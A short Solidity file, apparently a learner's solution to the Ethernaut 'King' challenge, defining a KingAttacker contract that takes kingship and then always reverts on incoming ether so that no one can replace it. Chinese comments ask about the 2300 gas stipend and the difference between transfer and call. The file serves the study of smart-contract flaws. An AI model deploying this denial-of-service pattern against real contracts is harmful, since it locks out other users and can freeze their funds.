// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "./King.sol";
import "hardhat/console.sol";

contract KingAttacker {
    address payable public king;

    constructor(address _addr) {
        king = payable(_addr);
    }

    receive() external payable {
        revert("You can't claim to be King!");
    }

    function attack() external payable {
        require(msg.value > 10 ether, "Not enough money to be king");
        // TODO
        // 这个2300 gas是什么东西
        // https://stackoverflow.com/questions/72429117/contract-call-run-out-of-gas-and-made-the-transaction-revert-hardhat
        // https://docs.soliditylang.org/en/latest/security-considerations.html?highlight=2300%20gas#sending-and-receiving-ether

        // 这里这两个语法的区别？
        // king.transfer(msg.value);
        // king.call{value: msg.value, gas: 2300}("");
        king.call{value: msg.value}("");
    }
}
